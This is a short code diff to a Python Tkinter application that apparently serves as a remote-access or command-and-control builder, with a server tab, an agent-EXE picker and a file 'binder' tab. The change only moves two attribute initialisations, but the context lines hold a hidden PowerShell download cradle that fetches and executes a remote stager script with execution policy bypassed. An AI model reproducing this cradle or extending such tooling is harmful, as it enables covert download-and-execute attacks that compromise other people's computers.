@@ -27,6 +27,8 @@ class UnifiedApp:
         self._build_web_tab()
         self._build_binder_tab()
 
+        self._web_server = None
+        self._web_thread = None
         self.root.protocol("WM_DELETE_WINDOW", self._on_close)
         # Start server automatically
         self.root.after(500, self.server_tab._start_server)
@@ -98,8 +100,6 @@ class UnifiedApp:
         self.stager_text = tk.Text(stg, bg=DARKER_BG, fg=TEXT_FG, font=("Consolas", 8), relief="flat", height=3)
         self.stager_text.insert("1.0", "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"iex(New-Object Net.WebClient).DownloadString('http://IP:PORT/stager.ps1')\"")
         self.stager_text.pack(fill="x", padx=5, pady=3)
-        self._web_server = None
-        self._web_thread = None
 
     def _web_browse_agent(self):
         f = filedialog.askopenfilename(title="Select agent EXE", filetypes=[("EXE files","*.exe")])
